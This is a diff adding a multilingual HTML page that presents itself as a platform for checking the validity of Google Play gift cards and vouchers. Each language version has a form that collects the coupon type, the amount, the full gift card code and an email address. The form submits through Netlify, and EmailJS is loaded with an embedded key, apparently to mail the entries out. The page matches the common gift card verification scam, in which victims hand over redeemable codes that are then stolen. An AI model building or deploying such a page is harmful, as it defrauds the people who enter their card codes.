@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coupon Checker Platform</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("4WnekgeoUrVyDkB5O");
+        })();
+    </script>
+</head>
+<body>
+    <!-- Language Selection Page -->
+    <div id="language-select" class="page active">
+        <div class="container">
+            <div class="logo">
+                <img src="https://images.unsplash.com/photo-1607082349566-187342175e2f?w=150" alt="Logo" class="logo-img">
+            </div>
+            <h1>WELCOME TO THE PLATFORM FOR CHECKING THE VALIDITY OF YOUR VOUCHERS</h1>
+            <h2>Before continue</h2>
+            <h3>Choose your language...</h3>
+            
+            <div class="language-grid">
+                <button onclick="selectLanguage('fr')" class="lang-btn">Français</button>
+                <!-- <button onclick="selectLanguage('en')" class="lang-btn">English</button> -->
+                <button onclick="selectLanguage('de')" class="lang-btn">Deutsch</button>
+                <button onclick="selectLanguage('es')" class="lang-btn">Español</button>
+                <!-- <button onclick="selectLanguage('it')" class="lang-btn">Italiano</button> -->
+                <!-- <button onclick="selectLanguage('pt')" class="lang-btn">Português</button> -->
+            </div>
+        </div>
+    </div>
+
+    <!-- French Form Page -->
+    <div id="form-page-fr" class="page">
+        <div class="container">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Vérifiez la validité de vos coupons</h1>
+                    <div class="hero-image">
+                        <img src="./src/google play.jpg" alt="Cartes Google Play" class="gift-cards">
+                    </div>
+                </div>
+            </div>
+
+            <form name="coupon-check-fr" method="POST" data-netlify="true">
+                <div class="form-group">
+                    <label for="coupon-type">TYPE DE COUPON</label>
+                    <select id="coupon-type" name="coupon-type" required>
+                        <option value="">Choisissez le type de coupon</option>
+                        <option value="gift">Carte Cadeau</option>
+                        <option value="discount">Coupon de réduction</option>
+                    </select>
+                </div>
+
+                <div class="buy-link">
+                    Pour acheter des cartes cadeaux ou coupons <a href="#" class="cyan-link">cliquez ici</a>
+                </div>
+
+                <div class="form-group">
+                    <label>CACHEZ LE CODE</label>
+                    <div class="radio-group">
+                        <label class="radio">
+                            <input type="radio" name="hide-code" value="yes">
+                            <span>Oui</span>
+                        </label>
+                        <label class="radio">
+                            <input type="radio" name="hide-code" value="no">
+                            <span>Non</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount">MONTANT</label>
+                    <input type="number" id="amount" name="amount" placeholder="€" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="coupon-code">CODE DU COUPON</label>
+                    <input type="text" id="coupon-code" name="coupon-code" placeholder="XXXXXXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">E-MAIL</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+
+                <button type="submit" class="submit-btn">Authentifier</button>
+            </form>
+        </div>
+
+        <footer>
+            <div class="footer-section">
+                <h4>Besoin d'aide ?</h4>
+                <a href="#">Centre d'aide</a>
+                <a href="#">Politique de remboursement</a>
+                <a href="#">Politique de réclamation</a>
+                <a href="#">Contacter notre service client</a>
+            </div>
+            <div class="footer-section">
+                <h4>En savoir plus</h4>
+                <a href="#">A propos</a>
+                <a href="#">Mentions Légales</a>
+                <a href="#">Gains et récompenses</a>
+            </div>
+            <div class="footer-section">
+                <h4>Rester avec nous !</h4>
+                <a href="#">Facebook</a>
+                <a href="#">Instagram</a>
+                <a href="#">X</a>
+                <a href="#">LinkedIn</a>
+            </div>
+            <div class="footer-section">
+                <h4>A savoir</h4>
+                <p>Les noms des produits utilisés sur ce site internet le sont uniquement à des fins d'identification. Toutes les marques et marques déposées sont la propriété de leurs propriétaires respectifs</p>
+            </div>
+        </footer>
+    </div>
+
+<!-- Página del Formulario en Español -->
+<div id="form-page-es" class="page">
+    <div class="container">
+        <div class="hero">
+            <div class="hero-content">
+                <h1>Verifica la validez de tus cupones</h1>
+                <div class="hero-image">
+                    <img src="./src/google play.jpg" alt="Tarjetas de Google Play" class="gift-cards">
+                </div>
+            </div>
+        </div>
+
+        <form name="coupon-check-es" method="POST" data-netlify="true">
+            <div class="form-group">
+                <label for="coupon-type-es">TIPO DE CUPÓN</label>
+                <select id="coupon-type-es" name="tipo-cupon" required>
+                    <option value="">Selecciona el tipo de cupón</option>
+                    <option value="gift">Tarjeta Regalo</option>
+                    <option value="discount">Cupón de Descuento</option>
+                </select>
+            </div>
+
+            <div class="buy-link">
+                Para comprar tarjetas regalo o cupones <a href="#" class="cyan-link">haz clic aquí</a>
+            </div>
+
+            <div class="form-group">
+                <label>OCULTAR CÓDIGO</label>
+                <div class="radio-group">
+                    <label class="radio">
+                        <input type="radio" name="ocultar-codigo" value="si">
+                        <span>Sí</span>
+                    </label>
+                    <label class="radio">
+                        <input type="radio" name="ocultar-codigo" value="no">
+                        <span>No</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="amount-es">CANTIDAD</label>
+                <input type="number" id="amount-es" name="cantidad" placeholder="€" required>
+            </div>
+
+            <div class="form-group">
+                <label for="coupon-code-es">CÓDIGO DEL CUPÓN</label>
+                <input type="text" id="coupon-code-es" name="codigo-cupon" placeholder="XXXXXXXX" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email-es">CORREO ELECTRÓNICO</label>
+                <input type="email" id="email-es" name="email" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Autenticar</button>
+        </form>
+    </div>
+
+    <footer>
+        <div class="footer-section">
+            <h4>¿Necesitas ayuda?</h4>
+            <a href="#">Centro de Ayuda</a>
+            <a href="#">Política de Reembolso</a>
+            <a href="#">Política de Reclamaciones</a>
+            <a href="#">Contactar con Servicio al Cliente</a>
+        </div>
+        <div class="footer-section">
+            <h4>Más información</h4>
+            <a href="#">Sobre Nosotros</a>
+            <a href="#">Aviso Legal</a>
+            <a href="#">Recompensas y Beneficios</a>
+        </div>
+        <div class="footer-section">
+            <h4>¡Síguenos!</h4>
+            <a href="#">Facebook</a>
+            <a href="#">Instagram</a>
+            <a href="#">X (Twitter)</a>
+            <a href="#">LinkedIn</a>
+        </div>
+        <div class="footer-section">
+            <h4>Aviso importante</h4>
+            <p>Los nombres de productos utilizados en este sitio web son solo para fines de identificación. Todas las marcas comerciales y marcas registradas son propiedad de sus respectivos dueños.</p>
+        </div>
+    </footer>
+</div>
+
+
+<!-- Pagina del Formulario in Italiano -->
+<div id="form-page-it" class="page">
+    <div class="container">
+        <div class="hero">
+            <div class="hero-content">
+                <h1>Verifica la validità dei tuoi coupon</h1>
+                <div class="hero-image">
+                    <img src="./src/google play.jpg" alt="Carte Google Play" class="gift-cards">
+                </div>
+            </div>
+        </div>
+
+        <form name="coupon-check-it" method="POST" data-netlify="true">
+            <div class="form-group">
+                <label for="coupon-type-it">TIPO DI COUPON</label>
+                <select id="coupon-type-it" name="tipo-coupon" required>
+                    <option value="">Seleziona il tipo di coupon</option>
+                    <option value="gift">Carta Regalo</option>
+                    <option value="discount">Coupon Sconto</option>
+                </select>
+            </div>
+
+            <div class="buy-link">
+                Per acquistare carte regalo o coupon <a href="#" class="cyan-link">clicca qui</a>
+            </div>
+
+            <div class="form-group">
+                <label>NASCONDI CODICE</label>
+                <div class="radio-group">
+                    <label class="radio">
+                        <input type="radio" name="nascondi-codice" value="si">
+                        <span>Sì</span>
+                    </label>
+                    <label class="radio">
+                        <input type="radio" name="nascondi-codice" value="no">
+                        <span>No</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="amount-it">IMPORTO</label>
+                <input type="number" id="amount-it" name="importo" placeholder="€" required>
+            </div>
+
+            <div class="form-group">
+                <label for="coupon-code-it">CODICE COUPON</label>
+                <input type="text" id="coupon-code-it" name="codice-coupon" placeholder="XXXXXXXX" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email-it">E-MAIL</label>
+                <input type="email" id="email-it" name="email" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Autentica</button>
+        </form>
+    </div>
+
+    <footer>
+        <div class="footer-section">
+            <h4>Hai bisogno di aiuto?</h4>
+            <a href="#">Centro Assistenza</a>
+            <a href="#">Politica di Rimborso</a>
+            <a href="#">Politica dei Reclami</a>
+            <a href="#">Contatta il Servizio Clienti</a>
+        </div>
+        <div class="footer-section">
+            <h4>Scopri di più</h4>
+            <a href="#">Chi Siamo</a>
+            <a href="#">Note Legali</a>
+            <a href="#">Vantaggi e Benefici</a>
+        </div>
+        <div class="footer-section">
+            <h4>Seguici!</h4>
+            <a href="#">Facebook</a>
+            <a href="#">Instagram</a>
+            <a href="#">X (Twitter)</a>
+            <a href="#">LinkedIn</a>
+        </div>
+        <div class="footer-section">
+            <h4>Nota importante</h4>
+            <p>I nomi dei prodotti utilizzati su questo sito web sono solo a scopo identificativo. Tutti i marchi e i marchi registrati sono proprietà dei rispettivi proprietari.</p>
+        </div>
+    </footer>
+</div>
+
+<!-- Página do Formulário em Português -->
+<div id="form-page-pt" class="page">
+    <div class="container">
+        <div class="hero">
+            <div class="hero-content">
+                <h1>Verifique a validade dos seus cupões</h1>
+                <div class="hero-image">
+                    <img src="./src/google play.jpg" alt="Cartões Google Play" class="gift-cards">
+                </div>
+            </div>
+        </div>
+
+        <form name="coupon-check-pt" method="POST" data-netlify="true">
+            <div class="form-group">
+                <label for="coupon-type-pt">TIPO DE CUPÃO</label>
+                <select id="coupon-type-pt" name="tipo-cupao" required>
+                    <option value="">Selecione o tipo de cupão</option>
+                    <option value="gift">Cartão Presente</option>
+                    <option value="discount">Cupão de Desconto</option>
+                </select>
+            </div>
+
+            <div class="buy-link">
+                Para comprar cartões presente ou cupões <a href="#" class="cyan-link">clique aqui</a>
+            </div>
+
+            <div class="form-group">
+                <label>OCULTAR CÓDIGO</label>
+                <div class="radio-group">
+                    <label class="radio">
+                        <input type="radio" name="ocultar-codigo" value="sim">
+                        <span>Sim</span>
+                    </label>
+                    <label class="radio">
+                        <input type="radio" name="ocultar-codigo" value="nao">
+                        <span>Não</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="amount-pt">VALOR</label>
+                <input type="number" id="amount-pt" name="valor" placeholder="€" required>
+            </div>
+
+            <div class="form-group">
+                <label for="coupon-code-pt">CÓDIGO DO CUPÃO</label>
+                <input type="text" id="coupon-code-pt" name="codigo-cupao" placeholder="XXXXXXXX" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email-pt">E-MAIL</label>
+                <input type="email" id="email-pt" name="email" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Autenticar</button>
+        </form>
+    </div>
+
+    <footer>
+        <div class="footer-section">
+            <h4>Precisa de ajuda?</h4>
+            <a href="#">Centro de Ajuda</a>
+            <a href="#">Política de Reembolso</a>
+            <a href="#">Política de Reclamações</a>
+            <a href="#">Contactar o Serviço ao Cliente</a>
+        </div>
+        <div class="footer-section">
+            <h4>Saiba mais</h4>
+            <a href="#">Sobre Nós</a>
+            <a href="#">Aviso Legal</a>
+            <a href="#">Vantagens e Benefícios</a>
+        </div>
+        <div class="footer-section">
+            <h4>Siga-nos!</h4>
+            <a href="#">Facebook</a>
+            <a href="#">Instagram</a>
+            <a href="#">X (Twitter)</a>
+            <a href="#">LinkedIn</a>
+        </div>
+        <div class="footer-section">
+            <h4>Nota importante</h4>
+            <p>Os nomes de produtos utilizados neste website são apenas para fins de identificação. Todas as marcas comerciais e marcas registadas são propriedade dos respetivos donos.</p>
+        </div>
+    </footer>
+</div>
+
+    <!-- English Form Page -->
+    <div id="form-page-en" class="page">
+        <div class="container">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Check the validity of your coupons</h1>
+                    <div class="hero-image">
+                        <img src="./src/google play.jpg" alt="Google Play Cards" class="gift-cards">
+                    </div>
+                </div>
+            </div>
+
+            <form name="coupon-check-en" method="POST" data-netlify="true">
+                <div class="form-group">
+                    <label for="coupon-type-en">COUPON TYPE</label>
+                    <select id="coupon-type-en" name="coupon-type" required>
+                        <option value="">Choose coupon type</option>
+                        <option value="gift">Gift Card</option>
+                        <option value="discount">Discount Coupon</option>
+                    </select>
+                </div>
+
+                <div class="buy-link">
+                    To purchase gift cards or coupons <a href="#" class="cyan-link">click here</a>
+                </div>
+
+                <div class="form-group">
+                    <label>HIDE CODE</label>
+                    <div class="radio-group">
+                        <label class="radio">
+                            <input type="radio" name="hide-code" value="yes">
+                            <span>Yes</span>
+                        </label>
+                        <label class="radio">
+                            <input type="radio" name="hide-code" value="no">
+                            <span>No</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount-en">AMOUNT</label>
+                    <input type="number" id="amount-en" name="amount" placeholder="€" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="coupon-code-en">COUPON CODE</label>
+                    <input type="text" id="coupon-code-en" name="coupon-code" placeholder="XXXXXXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email-en">E-MAIL</label>
+                    <input type="email" id="email-en" name="email" required>
+                </div>
+
+                <button type="submit" class="submit-btn">Authenticate</button>
+            </form>
+        </div>
+
+        <footer>
+            <div class="footer-section">
+                <h4>Need help?</h4>
+                <a href="#">Help Center</a>
+                <a href="#">Refund Policy</a>
+                <a href="#">Complaint Policy</a>
+                <a href="#">Contact Customer Service</a>
+            </div>
+            <div class="footer-section">
+                <h4>Learn more</h4>
+                <a href="#">About</a>
+                <a href="#">Legal Notice</a>
+                <a href="#">Rewards & Benefits</a>
+            </div>
+            <div class="footer-section">
+                <h4>Stay with us!</h4>
+                <a href="#">Facebook</a>
+                <a href="#">Instagram</a>
+                <a href="#">X</a>
+                <a href="#">LinkedIn</a>
+            </div>
+            <div class="footer-section">
+                <h4>Please note</h4>
+                <p>Product names used on this website are for identification purposes only. All trademarks and registered trademarks are the property of their respective owners</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- German Form Page -->
+    <div id="form-page-de" class="page">
+        <div class="container">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Überprüfen Sie die Gültigkeit Ihrer Gutscheine</h1>
+                    <div class="hero-image">
+                        <img src="./src/google play.jpg" alt="Google Play Karten" class="gift-cards">
+                    </div>
+                </div>
+            </div>
+
+            <form name="coupon-check-de" method="POST" data-netlify="true">
+                <div class="form-group">
+                    <label for="coupon-type-de">GUTSCHEINTYP</label>
+                    <select id="coupon-type-de" name="coupon-type" required>
+                        <option value="">Wählen Sie den Gutscheintyp</option>
+                        <option value="gift">Geschenkkarte</option>
+                        <option value="discount">Rabattgutschein</option>
+                    </select>
+                </div>
+
+                <div class="buy-link">
+                    Um Geschenkkarten oder Gutscheine zu kaufen, <a href="#" class="cyan-link">klicken Sie hier</a>
+                </div>
+
+                <div class="form-group">
+                    <label>CODE VERBERGEN</label>
+                    <div class="radio-group">
+                        <label class="radio">
+                            <input type="radio" name="hide-code" value="yes">
+                            <span>Ja</span>
+                        </label>
+                        <label class="radio">
+                            <input type="radio" name="hide-code" value="no">
+                            <span>Nein</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount-de">BETRAG</label>
+                    <input type="number" id="amount-de" name="amount" placeholder="€" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="coupon-code-de">GUTSCHEINCODE</label>
+                    <input type="text" id="coupon-code-de" name="coupon-code" placeholder="XXXXXXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email-de">E-MAIL</label>
+                    <input type="email" id="email-de" name="email" required>
+                </div>
+
+                <button type="submit" class="submit-btn">Authentifizieren</button>
+            </form>
+        </div>
+
+        <footer>
+            <div class="footer-section">
+                <h4>Brauchen Sie Hilfe?</h4>
+                <a href="#">Hilfezentrum</a>
+                <a href="#">Rückerstattungsrichtlinie</a>
+                <a href="#">Beschwerderichtlinie</a>
+                <a href="#">Kundenservice kontaktieren</a>
+            </div>
+            <div class="footer-section">
+                <h4>Mehr erfahren</h4>
+                <a href="#">Über uns</a>
+                <a href="#">Rechtliche Hinweise</a>
+                <a href="#">Prämien & Vorteile</a>
+            </div>
+            <div class="footer-section">
+                <h4>Bleiben Sie bei uns!</h4>
+                <a href="#">Facebook</a>
+                <a href="#">Instagram</a>
+                <a href="#">X</a>
+                <a href="#">LinkedIn</a>
+            </div>
+            <div class="footer-section">
+                <h4>Bitte beachten</h4>
+                <p>Die auf dieser Website verwendeten Produktnamen dienen ausschließlich zur Identifizierung. Alle Marken und eingetragenen Warenzeichen sind Eigentum ihrer jeweiligen Inhaber</p>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
